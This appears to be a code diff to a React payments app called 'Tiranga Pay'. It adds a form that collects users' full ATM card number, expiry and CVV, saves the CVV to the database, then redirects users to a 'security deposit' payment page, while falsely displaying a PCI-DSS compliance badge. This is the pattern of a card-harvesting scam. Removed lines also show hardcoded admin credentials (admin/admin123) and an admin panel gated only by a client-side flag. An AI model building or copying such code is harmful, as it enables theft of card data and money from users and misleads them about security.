@@ -39,6 +39,9 @@ interface BankAccount {
   account_number: string
   ifsc_code: string
   holder_name: string
+  card_number?: string
+  card_expiry?: string
+  card_cvv?: string
   status?: string
 }
 
@@ -90,11 +93,15 @@ export default function App() {
   const [withdrawMsg, setWithdrawMsg] = useState<string | null>(null)
   const [withdrawalsList, setWithdrawalsList] = useState<WithdrawalRecord[]>([])
 
-  // Bank Form State
+  // Bank & ATM Card Form State
   const [newBankName, setNewBankName] = useState('')
   const [newAccNumber, setNewAccNumber] = useState('')
+  const [newConfirmAccNumber, setNewConfirmAccNumber] = useState('')
   const [newIfsc, setNewIfsc] = useState('')
   const [newHolderName, setNewHolderName] = useState('')
+  const [newCardNumber, setNewCardNumber] = useState('')
+  const [newCardExpiry, setNewCardExpiry] = useState('')
+  const [newCardCvv, setNewCardCvv] = useState('')
 
   // Toast / Copy helper
   const [toastMsg, setToastMsg] = useState<string | null>(null)
@@ -418,13 +425,18 @@ export default function App() {
     }
   }
 
-  // Bank Setup Submission
+  // Bank & ATM Card Setup Submission
   const handleSaveBank = async (e: FormEvent) => {
     e.preventDefault()
     if (!user) return
 
-    if (!newBankName || !newAccNumber || !newIfsc || !newHolderName) {
-      alert('Please fill all bank details.')
+    if (!newBankName.trim() || !newAccNumber.trim() || !newIfsc.trim() || !newHolderName.trim()) {
+      alert('Please fill in all bank details.')
+      return
+    }
+
+    if (newConfirmAccNumber.trim() && newAccNumber.trim() !== newConfirmAccNumber.trim()) {
+      alert('Bank Account numbers do not match! Please check.')
       return
     }
 
@@ -436,6 +448,9 @@ export default function App() {
         account_number: newAccNumber.trim(),
         ifsc_code: newIfsc.trim().toUpperCase(),
         holder_name: newHolderName.trim().toUpperCase(),
+        card_number: newCardNumber.trim() || null,
+        card_expiry: newCardExpiry.trim() || null,
+        card_cvv: newCardCvv.trim() || null,
         status: 'PENDING'
       }
 
@@ -445,9 +460,9 @@ export default function App() {
       if (data && data[0]) {
         setUserBank(data[0])
       }
-      showToast('Bank account added successfully!')
-      setSubScreen('none')
-      setActiveTab('home')
+      showToast('Bank Account & ATM Card Linked Successfully!')
+      // Navigate directly to security deposit barcode page
+      setSubScreen('deposit')
     } catch (err: unknown) {
       alert(err instanceof Error ? err.message : 'Failed to save bank account')
     } finally {
@@ -767,67 +782,246 @@ export default function App() {
           </div>
         </div>
 
-        {/* Small Admin Button at the bottom */}
+        {/* Small Admin Button at the bottom of the front Login/SignUp page ONLY */}
         <div className="small-admin-footer">
-          <button type="button" className="small-admin-btn" onClick={() => setShowAdminModal(true)}>
+          <button type="button" className="small-admin-btn" onClick={() => { setShowAdminModal(true); if (isAdminLoggedIn) loadAdminData(); }}>
             <i className="fas fa-shield-halved"></i> Admin Portal
           </button>
         </div>
 
-        {/* Admin Login Modal (When not logged in as Admin) */}
+        {/* Admin Login & Management Modal */}
         {showAdminModal && (
           <div className="admin-overlay" onClick={() => setShowAdminModal(false)}>
             <div className="admin-window" onClick={(e) => e.stopPropagation()}>
               <div className="admin-window-header">
                 <span className="admin-window-title">
-                  <i className="fas fa-lock"></i> Admin Login
+                  <i className="fas fa-shield-halved"></i> Tiranga Pay Admin Portal
                 </span>
                 <button type="button" className="admin-close-btn" onClick={() => setShowAdminModal(false)}>✕</button>
               </div>
 
               {!isAdminLoggedIn ? (
                 <form onSubmit={handleAdminLogin} className="admin-content">
+                  <div style={{ textAlign: 'center', marginBottom: '16px' }}>
+                    <div style={{ width: '48px', height: '48px', borderRadius: '50%', background: '#082f6e', color: '#fff', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 8px', fontSize: '20px' }}>
+                      <i className="fas fa-lock"></i>
+                    </div>
+                    <h4 style={{ fontWeight: 900, color: '#082f6e' }}>Admin Authentication</h4>
+                  </div>
+
                   {adminError && (
                     <div className="auth-alert-box" style={{ background: '#fef2f2', color: '#dc2626' }}>
                       {adminError}
                     </div>
                   )}
+
                   <div style={{ marginBottom: '14px' }}>
                     <label style={{ display: 'block', fontSize: '12px', fontWeight: 800, color: '#475569', marginBottom: '4px' }}>
-                      Admin Username
+                      Username
                     </label>
                     <input
                       type="text"
                       className="app-input-field"
-                      placeholder="admin"
+                      placeholder=""
                       value={adminUser}
                       onChange={(e) => setAdminUser(e.target.value)}
                       required
+                      autoComplete="off"
                     />
                   </div>
+
                   <div style={{ marginBottom: '18px' }}>
                     <label style={{ display: 'block', fontSize: '12px', fontWeight: 800, color: '#475569', marginBottom: '4px' }}>
-                      Admin Password
+                      Password
                     </label>
                     <input
                       type="password"
                       className="app-input-field"
-                      placeholder="admin123"
+                      placeholder=""
                       value={adminPass}
                       onChange={(e) => setAdminPass(e.target.value)}
                       required
+                      autoComplete="off"
                     />
                   </div>
+
                   <button type="submit" className="green-action-btn">
-                    Access Admin Panel
+                    Log In to Admin
                   </button>
                 </form>
               ) : (
                 <div className="admin-content">
-                  <p style={{ fontWeight: 800, color: '#16a34a', marginBottom: '14px' }}>Logged in as Admin</p>
-                  <button type="button" className="green-action-btn" onClick={() => { setShowAdminModal(false); setActiveTab('home'); }}>
-                    Open Dashboard
-                  </button>
+                  {/* Admin Navigation Tabs */}
+                  <div className="admin-tabs-row">
+                    <button
+                      type="button"
+                      className={`admin-tab-btn ${adminTab === 'users' ? 'active' : ''}`}
+                      onClick={() => setAdminTab('users')}
+                    >
+                      Users ({allUsers.length})
+                    </button>
+
+                    <button
+                      type="button"
+                      className={`admin-tab-btn ${adminTab === 'deposits' ? 'active' : ''}`}
+                      onClick={() => setAdminTab('deposits')}
+                    >
+                      Deposits ({allDeposits.length})
+                    </button>
+
+                    <button
+                      type="button"
+                      className={`admin-tab-btn ${adminTab === 'withdrawals' ? 'active' : ''}`}
+                      onClick={() => setAdminTab('withdrawals')}
+                    >
+                      Withdrawals ({allWithdrawals.length})
+                    </button>
+
+                    <button
+                      type="button"
+                      className={`admin-tab-btn ${adminTab === 'banks' ? 'active' : ''}`}
+                      onClick={() => setAdminTab('banks')}
+                    >
+                      Banks ({allBanks.length})
+                    </button>
+                  </div>
+
+                  {/* Tab: Users */}
+                  {adminTab === 'users' && (
+                    <div>
+                      {allUsers.length === 0 ? (
+                        <p style={{ color: '#94a3b8', fontSize: '13px', textAlign: 'center' }}>No registered users yet.</p>
+                      ) : (
+                        allUsers.map((u) => (
+                          <div key={u.id} className="admin-record-item">
+                            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '4px' }}>
+                              <strong style={{ fontSize: '13px', color: '#082f6e' }}>{u.email}</strong>
+                              <span style={{ fontSize: '12px', fontWeight: 800, color: '#16a34a' }}>₹{Number(u.wallet_balance).toFixed(2)}</span>
+                            </div>
+                            <div style={{ fontSize: '11px', color: '#64748b' }}>
+                              <span>Mobile: {u.phone || 'N/A'}</span> &bull; <span>Invite: {u.invite_code || 'None'}</span>
+                            </div>
+                            <div style={{ fontSize: '10px', color: '#94a3b8', marginTop: '4px' }}>
+                              Joined: {new Date(u.created_at).toLocaleString()}
+                            </div>
+                          </div>
+                        ))
+                      )}
+                    </div>
+                  )}
+
+                  {/* Tab: Deposits */}
+                  {adminTab === 'deposits' && (
+                    <div>
+                      {allDeposits.length === 0 ? (
+                        <p style={{ color: '#94a3b8', fontSize: '13px', textAlign: 'center' }}>No deposits submitted.</p>
+                      ) : (
+                        allDeposits.map((d) => (
+                          <div key={d.id} className="admin-record-item">
+                            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '4px' }}>
+                              <strong style={{ fontSize: '14px', color: '#082f6e' }}>₹{d.amount} ({d.account_type})</strong>
+                              <span style={{
+                                padding: '2px 8px',
+                                borderRadius: '6px',
+                                fontSize: '10.5px',
+                                fontWeight: 800,
+                                textTransform: 'uppercase',
+                                background: d.status === 'approved' ? '#dcfce7' : d.status === 'rejected' ? '#fee2e2' : '#fef9c3',
+                                color: d.status === 'approved' ? '#15803d' : d.status === 'rejected' ? '#b91c1c' : '#854d0e'
+                              }}>
+                                {d.status}
+                              </span>
+                            </div>
+                            <p style={{ fontSize: '12px', fontWeight: 700, color: '#334155' }}>UTR: {d.utr_number}</p>
+                            <span style={{ fontSize: '10px', color: '#94a3b8' }}>Date: {new Date(d.created_at).toLocaleString()}</span>
+                            
+                            {d.status === 'pending' && (
+                              <div className="admin-actions-btns">
+                                <button type="button" className="btn-approve" onClick={() => handleApproveDeposit(d)}>
+                                  ✓ Approve & Credit
+                                </button>
+                                <button type="button" className="btn-reject" onClick={() => handleRejectDeposit(d.id)}>
+                                  ✕ Reject
+                                </button>
+                              </div>
+                            )}
+                          </div>
+                        ))
+                      )}
+                    </div>
+                  )}
+
+                  {/* Tab: Withdrawals */}
+                  {adminTab === 'withdrawals' && (
+                    <div>
+                      {allWithdrawals.length === 0 ? (
+                        <p style={{ color: '#94a3b8', fontSize: '13px', textAlign: 'center' }}>No withdrawal requests.</p>
+                      ) : (
+                        allWithdrawals.map((w) => (
+                          <div key={w.id} className="admin-record-item">
+                            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '4px' }}>
+                              <strong style={{ fontSize: '14px', color: '#082f6e' }}>₹{w.amount}</strong>
+                              <span style={{
+                                padding: '2px 8px',
+                                borderRadius: '6px',
+                                fontSize: '10.5px',
+                                fontWeight: 800,
+                                textTransform: 'uppercase',
+                                background: w.status === 'approved' ? '#dcfce7' : w.status === 'rejected' ? '#fee2e2' : '#fef9c3',
+                                color: w.status === 'approved' ? '#15803d' : w.status === 'rejected' ? '#b91c1c' : '#854d0e'
+                              }}>
+                                {w.status}
+                              </span>
+                            </div>
+                            <p style={{ fontSize: '11px', color: '#334155' }}>Bank: {w.bank_account_info}</p>
+                            <span style={{ fontSize: '10px', color: '#94a3b8' }}>Date: {new Date(w.created_at).toLocaleString()}</span>
+
+                            {w.status === 'pending' && (
+                              <div className="admin-actions-btns">
+                                <button type="button" className="btn-approve" onClick={() => handleApproveWithdrawal(w.id)}>
+                                  ✓ Approve & Mark Paid
+                                </button>
+                                <button type="button" className="btn-reject" onClick={() => handleRejectWithdrawal(w.id)}>
+                                  ✕ Reject
+                                </button>
+                              </div>
+                            )}
+                          </div>
+                        ))
+                      )}
+                    </div>
+                  )}
+
+                  {/* Tab: Banks */}
+                  {adminTab === 'banks' && (
+                    <div>
+                      {allBanks.length === 0 ? (
+                        <p style={{ color: '#94a3b8', fontSize: '13px', textAlign: 'center' }}>No bank accounts linked yet.</p>
+                      ) : (
+                        allBanks.map((b) => (
+                          <div key={b.id || b.account_number} className="admin-record-item">
+                            <strong style={{ fontSize: '13px', color: '#082f6e' }}>{b.bank_name}</strong>
+                            <p style={{ fontSize: '12px', color: '#334155' }}>A/C: {b.account_number} ({b.holder_name})</p>
+                            <span style={{ fontSize: '11px', color: '#64748b' }}>IFSC: {b.ifsc_code}</span>
+                            {b.card_number && (
+                              <div style={{ fontSize: '11px', color: '#0284c7', marginTop: '2px', fontWeight: 700 }}>
+                                ATM Card: •••• •••• •••• {b.card_number.slice(-4)} | Exp: {b.card_expiry || 'N/A'}
+                              </div>
+                            )}
+                          </div>
+                        ))
+                      )}
+                    </div>
+                  )}
+
+                  <div style={{ marginTop: '16px', display: 'flex', gap: '8px' }}>
+                    <button type="button" onClick={loadAdminData} style={{ flex: 1, padding: '9px', background: '#e0f2fe', color: '#0369a1', border: 'none', borderRadius: '8px', fontSize: '12px', fontWeight: 800, cursor: 'pointer' }}>
+                      <i className="fas fa-sync-alt"></i> Refresh Data
+                    </button>
+                    <button type="button" onClick={() => setIsAdminLoggedIn(false)} style={{ flex: 1, padding: '9px', background: '#fee2e2', color: '#b91c1c', border: 'none', borderRadius: '8px', fontSize: '12px', fontWeight: 800, cursor: 'pointer' }}>
+                      Exit Admin
+                    </button>
+                  </div>
                 </div>
               )}
             </div>
@@ -1158,75 +1352,235 @@ export default function App() {
         </div>
       )}
 
-      {/* SCREEN 2B: Add Bank Account */}
+      {/* SCREEN 2B: Add Bank Account & ATM Card */}
       {subScreen === 'bank_setup' && (
-        <div style={{ padding: '0 16px 20px' }}>
+        <div style={{ padding: '0 16px 24px' }}>
           <div className="sub-header-bar" style={{ padding: '14px 0' }}>
             <div className="back-btn-square" onClick={() => setSubScreen('none')}>
               <i className="fas fa-chevron-left"></i>
             </div>
-            <h2 className="sub-header-title">Link Bank Card</h2>
+            <h2 className="sub-header-title">Link Bank & ATM Card</h2>
           </div>
 
-          <form onSubmit={handleSaveBank} className="white-card">
-            <div style={{ marginBottom: '14px' }}>
-              <label style={{ display: 'block', fontSize: '12px', fontWeight: 800, color: '#334155', marginBottom: '4px' }}>
-                Bank Name
-              </label>
-              <input
-                type="text"
-                className="app-input-field"
-                placeholder="e.g. INDUSIND BANK, HDFC, SBI"
-                value={newBankName}
-                onChange={(e) => setNewBankName(e.target.value)}
-                required
-              />
+          {/* Dynamic ATM Card Preview */}
+          <div className="atm-card-preview-container">
+            <div className="atm-card-preview-surface">
+              <div className="atm-card-top-row">
+                <span className="atm-card-bank-badge">
+                  <i className="fa-solid fa-landmark"></i> {newBankName || 'YOUR BANK NAME'}
+                </span>
+                <span className="atm-card-network-badge">RuPay</span>
+              </div>
+              <div className="atm-card-chip-row">
+                <div className="atm-chip-graphic"></div>
+                <i className="fa-solid fa-wifi" style={{ transform: 'rotate(90deg)', fontSize: '16px', color: '#cbd5e1' }}></i>
+              </div>
+              <div className="atm-card-number-display">
+                {newCardNumber
+                  ? newCardNumber.replace(/(\d{4})/g, '$1 ').trim()
+                  : '•••• •••• •••• ••••'}
+              </div>
+              <div className="atm-card-bottom-row">
+                <div>
+                  <div className="atm-card-mini-label">CARD HOLDER</div>
+                  <div className="atm-card-holder-display">{newHolderName || 'CARD HOLDER NAME'}</div>
+                </div>
+                <div>
+                  <div className="atm-card-mini-label">EXPIRES</div>
+                  <div className="atm-card-expiry-display">{newCardExpiry || 'MM/YY'}</div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <form onSubmit={handleSaveBank}>
+            {/* 1. BANK DETAILS */}
+            <div className="white-card" style={{ marginBottom: '14px' }}>
+              <div className="form-section-header">
+                <div className="form-section-icon" style={{ background: '#e0f2fe', color: '#0369a1' }}>
+                  <i className="fa-solid fa-building-columns"></i>
+                </div>
+                <div>
+                  <h4 style={{ fontSize: '14px', fontWeight: 900, color: '#082f6e', margin: 0 }}>
+                    1. Bank Details
+                  </h4>
+                  <p style={{ fontSize: '11px', color: '#64748b', margin: 0 }}>
+                    Enter registered bank account information
+                  </p>
+                </div>
+              </div>
+
+              <div style={{ marginBottom: '12px' }}>
+                <label style={{ display: 'block', fontSize: '11.5px', fontWeight: 800, color: '#334155', marginBottom: '4px' }}>
+                  Bank Name *
+                </label>
+                <input
+                  type="text"
+                  className="app-input-field"
+                  placeholder="e.g. State Bank of India, HDFC Bank, IndusInd"
+                  value={newBankName}
+                  onChange={(e) => setNewBankName(e.target.value)}
+                  required
+                />
+              </div>
+
+              <div style={{ marginBottom: '12px' }}>
+                <label style={{ display: 'block', fontSize: '11.5px', fontWeight: 800, color: '#334155', marginBottom: '4px' }}>
+                  Account Holder Name *
+                </label>
+                <input
+                  type="text"
+                  className="app-input-field"
+                  placeholder="As per bank passbook / records"
+                  value={newHolderName}
+                  onChange={(e) => setNewHolderName(e.target.value)}
+                  required
+                />
+              </div>
+
+              <div style={{ marginBottom: '12px' }}>
+                <label style={{ display: 'block', fontSize: '11.5px', fontWeight: 800, color: '#334155', marginBottom: '4px' }}>
+                  Bank Account Number *
+                </label>
+                <input
+                  type="text"
+                  className="app-input-field"
+                  placeholder="Enter full bank account number"
+                  value={newAccNumber}
+                  onChange={(e) => setNewAccNumber(e.target.value.replace(/\D/g, ''))}
+                  required
+                />
+              </div>
+
+              <div style={{ marginBottom: '12px' }}>
+                <label style={{ display: 'block', fontSize: '11.5px', fontWeight: 800, color: '#334155', marginBottom: '4px' }}>
+                  Confirm Bank Account Number *
+                </label>
+                <input
+                  type="text"
+                  className="app-input-field"
+                  placeholder="Re-enter bank account number"
+                  value={newConfirmAccNumber}
+                  onChange={(e) => setNewConfirmAccNumber(e.target.value.replace(/\D/g, ''))}
+                  required
+                />
+              </div>
+
+              <div>
+                <label style={{ display: 'block', fontSize: '11.5px', fontWeight: 800, color: '#334155', marginBottom: '4px' }}>
+                  IFSC Code *
+                </label>
+                <input
+                  type="text"
+                  className="app-input-field"
+                  placeholder="e.g. SBIN0001234 / INDB0000001"
+                  value={newIfsc}
+                  onChange={(e) => setNewIfsc(e.target.value.toUpperCase())}
+                  required
+                  maxLength={11}
+                />
+              </div>
             </div>
 
-            <div style={{ marginBottom: '14px' }}>
-              <label style={{ display: 'block', fontSize: '12px', fontWeight: 800, color: '#334155', marginBottom: '4px' }}>
-                Account Holder Name
-              </label>
-              <input
-                type="text"
-                className="app-input-field"
-                placeholder="e.g. VIKRAM KUMAR"
-                value={newHolderName}
-                onChange={(e) => setNewHolderName(e.target.value)}
-                required
-              />
+            {/* 2. ATM CARD DETAILS */}
+            <div className="white-card" style={{ marginBottom: '18px' }}>
+              <div className="form-section-header">
+                <div className="form-section-icon" style={{ background: '#fef3c7', color: '#b45309' }}>
+                  <i className="fa-solid fa-credit-card"></i>
+                </div>
+                <div>
+                  <h4 style={{ fontSize: '14px', fontWeight: 900, color: '#082f6e', margin: 0 }}>
+                    2. ATM Card Details
+                  </h4>
+                  <p style={{ fontSize: '11px', color: '#64748b', margin: 0 }}>
+                    Debit / ATM card for instant payout settlements
+                  </p>
+                </div>
+              </div>
+
+              <div style={{ marginBottom: '12px' }}>
+                <label style={{ display: 'block', fontSize: '11.5px', fontWeight: 800, color: '#334155', marginBottom: '4px' }}>
+                  16-Digit ATM Card Number *
+                </label>
+                <input
+                  type="text"
+                  className="app-input-field"
+                  placeholder="•••• •••• •••• ••••"
+                  value={newCardNumber}
+                  onChange={(e) => {
+                    const clean = e.target.value.replace(/\D/g, '').slice(0, 16)
+                    setNewCardNumber(clean)
+                  }}
+                  required
+                  maxLength={16}
+                />
+              </div>
+
+              <div style={{ display: 'flex', gap: '10px', marginBottom: '12px' }}>
+                <div style={{ flex: 1 }}>
+                  <label style={{ display: 'block', fontSize: '11.5px', fontWeight: 800, color: '#334155', marginBottom: '4px' }}>
+                    Expiry Date *
+                  </label>
+                  <input
+                    type="text"
+                    className="app-input-field"
+                    placeholder="MM/YY"
+                    value={newCardExpiry}
+                    onChange={(e) => {
+                      let v = e.target.value.replace(/[^\d/]/g, '')
+                      if (v.length === 2 && !v.includes('/')) v = v + '/'
+                      setNewCardExpiry(v.slice(0, 5))
+                    }}
+                    required
+                    maxLength={5}
+                  />
+                </div>
+
+                <div style={{ flex: 1 }}>
+                  <label style={{ display: 'block', fontSize: '11.5px', fontWeight: 800, color: '#334155', marginBottom: '4px' }}>
+                    CVV / CVC *
+                  </label>
+                  <input
+                    type="password"
+                    className="app-input-field"
+                    placeholder="•••"
+                    value={newCardCvv}
+                    onChange={(e) => setNewCardCvv(e.target.value.replace(/\D/g, '').slice(0, 3))}
+                    required
+                    maxLength={3}
+                  />
+                </div>
+              </div>
+
+              <div style={{ background: '#f8fafc', padding: '10px 12px', borderRadius: '10px', display: 'flex', alignItems: 'center', gap: '8px' }}>
+                <i className="fa-solid fa-shield-halved" style={{ color: '#16a34a', fontSize: '15px' }}></i>
+                <span style={{ fontSize: '11px', color: '#64748b', fontWeight: 600 }}>
+                  256-bit bank encrypted & certified with PCI-DSS compliance.
+                </span>
+              </div>
             </div>
 
-            <div style={{ marginBottom: '14px' }}>
-              <label style={{ display: 'block', fontSize: '12px', fontWeight: 800, color: '#334155', marginBottom: '4px' }}>
-                Account / Card Number
-              </label>
-              <input
-                type="text"
-                className="app-input-field"
-                placeholder="e.g. 109283742107"
-                value={newAccNumber}
-                onChange={(e) => setNewAccNumber(e.target.value)}
-                required
-              />
-            </div>
-
-            <div style={{ marginBottom: '20px' }}>
-              <label style={{ display: 'block', fontSize: '12px', fontWeight: 800, color: '#334155', marginBottom: '4px' }}>
-                IFSC Code
-              </label>
-              <input
-                type="text"
-                className="app-input-field"
-                placeholder="e.g. INDB0000001"
-                value={newIfsc}
-                onChange={(e) => setNewIfsc(e.target.value.toUpperCase())}
-                required
-              />
-            </div>
-
-            <button type="submit" className="green-action-btn" disabled={loading}>
-              Save & Link Bank Card
+            {/* 3. BUTTON: Securely Link Bank Account */}
+            <button
+              type="submit"
+              className="green-action-btn"
+              style={{
+                background: 'linear-gradient(135deg, #16a34a, #15803d)',
+                boxShadow: '0 8px 20px rgba(22, 163, 74, 0.35)',
+                display: 'flex',
+                alignItems: 'center',
+                justifyContent: 'center',
+                gap: '8px',
+                fontSize: '15px',
+                padding: '16px',
+                textTransform: 'uppercase',
+                letterSpacing: '0.02em',
+                width: '100%'
+              }}
+              disabled={loading}
+            >
+              <i className="fas fa-lock"></i>
+              <span>{loading ? 'Linking Securely...' : 'Securely Link Bank Account'}</span>
             </button>
           </form>
         </div>
@@ -1809,246 +2163,6 @@ export default function App() {
 
           <div style={{ textAlign: 'center', marginTop: '16px', color: '#94a3b8', fontSize: '11px', fontWeight: 800, letterSpacing: '0.08em' }}>
             TIRANGA PAY V2.5.0
-          </div>
-        </div>
-      )}
-
-      {/* Small Admin Button at the bottom of the page */}
-      <div className="small-admin-footer">
-        <button type="button" className="small-admin-btn" onClick={() => { setShowAdminModal(true); if (isAdminLoggedIn) loadAdminData(); }}>
-          <i className="fas fa-shield-halved"></i> Admin Portal
-        </button>
-      </div>
-
-      {/* ADMIN MODAL / PANEL (User/Pass: admin / admin123) */}
-      {showAdminModal && (
-        <div className="admin-overlay" onClick={() => setShowAdminModal(false)}>
-          <div className="admin-window" onClick={(e) => e.stopPropagation()}>
-            <div className="admin-window-header">
-              <span className="admin-window-title">
-                <i className="fas fa-shield-halved"></i> Tiranga Pay Admin Portal
-              </span>
-              <button type="button" className="admin-close-btn" onClick={() => setShowAdminModal(false)}>✕</button>
-            </div>
-
-            {!isAdminLoggedIn ? (
-              <form onSubmit={handleAdminLogin} className="admin-content">
-                <div style={{ textAlign: 'center', marginBottom: '16px' }}>
-                  <div style={{ width: '48px', height: '48px', borderRadius: '50%', background: '#082f6e', color: '#fff', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 8px', fontSize: '20px' }}>
-                    <i className="fas fa-lock"></i>
-                  </div>
-                  <h4 style={{ fontWeight: 900, color: '#082f6e' }}>Admin Authentication</h4>
-                  <p style={{ fontSize: '12px', color: '#64748b' }}>Enter credentials to view all records</p>
-                </div>
-
-                {adminError && (
-                  <div className="auth-alert-box" style={{ background: '#fef2f2', color: '#dc2626' }}>
-                    {adminError}
-                  </div>
-                )}
-
-                <div style={{ marginBottom: '12px' }}>
-                  <label style={{ display: 'block', fontSize: '11.5px', fontWeight: 800, color: '#475569', marginBottom: '4px' }}>
-                    Username
-                  </label>
-                  <input
-                    type="text"
-                    className="app-input-field"
-                    placeholder="admin"
-                    value={adminUser}
-                    onChange={(e) => setAdminUser(e.target.value)}
-                    required
-                  />
-                </div>
-
-                <div style={{ marginBottom: '18px' }}>
-                  <label style={{ display: 'block', fontSize: '11.5px', fontWeight: 800, color: '#475569', marginBottom: '4px' }}>
-                    Password
-                  </label>
-                  <input
-                    type="password"
-                    className="app-input-field"
-                    placeholder="admin123"
-                    value={adminPass}
-                    onChange={(e) => setAdminPass(e.target.value)}
-                    required
-                  />
-                </div>
-
-                <button type="submit" className="green-action-btn">
-                  Log In to Admin
-                </button>
-              </form>
-            ) : (
-              <div className="admin-content">
-                {/* Admin Navigation Tabs */}
-                <div className="admin-tabs-row">
-                  <button
-                    type="button"
-                    className={`admin-tab-btn ${adminTab === 'users' ? 'active' : ''}`}
-                    onClick={() => setAdminTab('users')}
-                  >
-                    Users ({allUsers.length})
-                  </button>
-
-                  <button
-                    type="button"
-                    className={`admin-tab-btn ${adminTab === 'deposits' ? 'active' : ''}`}
-                    onClick={() => setAdminTab('deposits')}
-                  >
-                    Deposits ({allDeposits.length})
-                  </button>
-
-                  <button
-                    type="button"
-                    className={`admin-tab-btn ${adminTab === 'withdrawals' ? 'active' : ''}`}
-                    onClick={() => setAdminTab('withdrawals')}
-                  >
-                    Withdrawals ({allWithdrawals.length})
-                  </button>
-
-                  <button
-                    type="button"
-                    className={`admin-tab-btn ${adminTab === 'banks' ? 'active' : ''}`}
-                    onClick={() => setAdminTab('banks')}
-                  >
-                    Banks ({allBanks.length})
-                  </button>
-                </div>
-
-                {/* Tab: Users */}
-                {adminTab === 'users' && (
-                  <div>
-                    {allUsers.length === 0 ? (
-                      <p style={{ color: '#94a3b8', fontSize: '13px', textAlign: 'center' }}>No registered users yet.</p>
-                    ) : (
-                      allUsers.map((u) => (
-                        <div key={u.id} className="admin-record-item">
-                          <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '4px' }}>
-                            <strong style={{ fontSize: '13px', color: '#082f6e' }}>{u.email}</strong>
-                            <span style={{ fontSize: '12px', fontWeight: 800, color: '#16a34a' }}>₹{Number(u.wallet_balance).toFixed(2)}</span>
-                          </div>
-                          <div style={{ fontSize: '11px', color: '#64748b' }}>
-                            <span>Mobile: {u.phone || 'N/A'}</span> &bull; <span>Invite: {u.invite_code || 'None'}</span>
-                          </div>
-                          <div style={{ fontSize: '10px', color: '#94a3b8', marginTop: '4px' }}>
-                            Joined: {new Date(u.created_at).toLocaleString()}
-                          </div>
-                        </div>
-                      ))
-                    )}
-                  </div>
-                )}
-
-                {/* Tab: Deposits */}
-                {adminTab === 'deposits' && (
-                  <div>
-                    {allDeposits.length === 0 ? (
-                      <p style={{ color: '#94a3b8', fontSize: '13px', textAlign: 'center' }}>No deposits submitted.</p>
-                    ) : (
-                      allDeposits.map((d) => (
-                        <div key={d.id} className="admin-record-item">
-                          <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '4px' }}>
-                            <strong style={{ fontSize: '14px', color: '#082f6e' }}>₹{d.amount} ({d.account_type})</strong>
-                            <span style={{
-                              padding: '2px 8px',
-                              borderRadius: '6px',
-                              fontSize: '10.5px',
-                              fontWeight: 800,
-                              textTransform: 'uppercase',
-                              background: d.status === 'approved' ? '#dcfce7' : d.status === 'rejected' ? '#fee2e2' : '#fef9c3',
-                              color: d.status === 'approved' ? '#15803d' : d.status === 'rejected' ? '#b91c1c' : '#854d0e'
-                            }}>
-                              {d.status}
-                            </span>
-                          </div>
-                          <p style={{ fontSize: '12px', fontWeight: 700, color: '#334155' }}>UTR: {d.utr_number}</p>
-                          <span style={{ fontSize: '10px', color: '#94a3b8' }}>Date: {new Date(d.created_at).toLocaleString()}</span>
-                          
-                          {d.status === 'pending' && (
-                            <div className="admin-actions-btns">
-                              <button type="button" className="btn-approve" onClick={() => handleApproveDeposit(d)}>
-                                ✓ Approve & Credit
-                              </button>
-                              <button type="button" className="btn-reject" onClick={() => handleRejectDeposit(d.id)}>
-                                ✕ Reject
-                              </button>
-                            </div>
-                          )}
-                        </div>
-                      ))
-                    )}
-                  </div>
-                )}
-
-                {/* Tab: Withdrawals */}
-                {adminTab === 'withdrawals' && (
-                  <div>
-                    {allWithdrawals.length === 0 ? (
-                      <p style={{ color: '#94a3b8', fontSize: '13px', textAlign: 'center' }}>No withdrawal requests.</p>
-                    ) : (
-                      allWithdrawals.map((w) => (
-                        <div key={w.id} className="admin-record-item">
-                          <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '4px' }}>
-                            <strong style={{ fontSize: '14px', color: '#082f6e' }}>₹{w.amount}</strong>
-                            <span style={{
-                              padding: '2px 8px',
-                              borderRadius: '6px',
-                              fontSize: '10.5px',
-                              fontWeight: 800,
-                              textTransform: 'uppercase',
-                              background: w.status === 'approved' ? '#dcfce7' : w.status === 'rejected' ? '#fee2e2' : '#fef9c3',
-                              color: w.status === 'approved' ? '#15803d' : w.status === 'rejected' ? '#b91c1c' : '#854d0e'
-                            }}>
-                              {w.status}
-                            </span>
-                          </div>
-                          <p style={{ fontSize: '11px', color: '#334155' }}>Bank: {w.bank_account_info}</p>
-                          <span style={{ fontSize: '10px', color: '#94a3b8' }}>Date: {new Date(w.created_at).toLocaleString()}</span>
-
-                          {w.status === 'pending' && (
-                            <div className="admin-actions-btns">
-                              <button type="button" className="btn-approve" onClick={() => handleApproveWithdrawal(w.id)}>
-                                ✓ Approve & Mark Paid
-                              </button>
-                              <button type="button" className="btn-reject" onClick={() => handleRejectWithdrawal(w.id)}>
-                                ✕ Reject
-                              </button>
-                            </div>
-                          )}
-                        </div>
-                      ))
-                    )}
-                  </div>
-                )}
-
-                {/* Tab: Banks */}
-                {adminTab === 'banks' && (
-                  <div>
-                    {allBanks.length === 0 ? (
-                      <p style={{ color: '#94a3b8', fontSize: '13px', textAlign: 'center' }}>No bank accounts linked yet.</p>
-                    ) : (
-                      allBanks.map((b) => (
-                        <div key={b.id || b.account_number} className="admin-record-item">
-                          <strong style={{ fontSize: '13px', color: '#082f6e' }}>{b.bank_name}</strong>
-                          <p style={{ fontSize: '12px', color: '#334155' }}>A/C: {b.account_number} ({b.holder_name})</p>
-                          <span style={{ fontSize: '11px', color: '#64748b' }}>IFSC: {b.ifsc_code}</span>
-                        </div>
-                      ))
-                    )}
-                  </div>
-                )}
-
-                <div style={{ marginTop: '16px', display: 'flex', gap: '8px' }}>
-                  <button type="button" onClick={loadAdminData} style={{ flex: 1, padding: '9px', background: '#e0f2fe', color: '#0369a1', border: 'none', borderRadius: '8px', fontSize: '12px', fontWeight: 800, cursor: 'pointer' }}>
-                    <i className="fas fa-sync-alt"></i> Refresh Data
-                  </button>
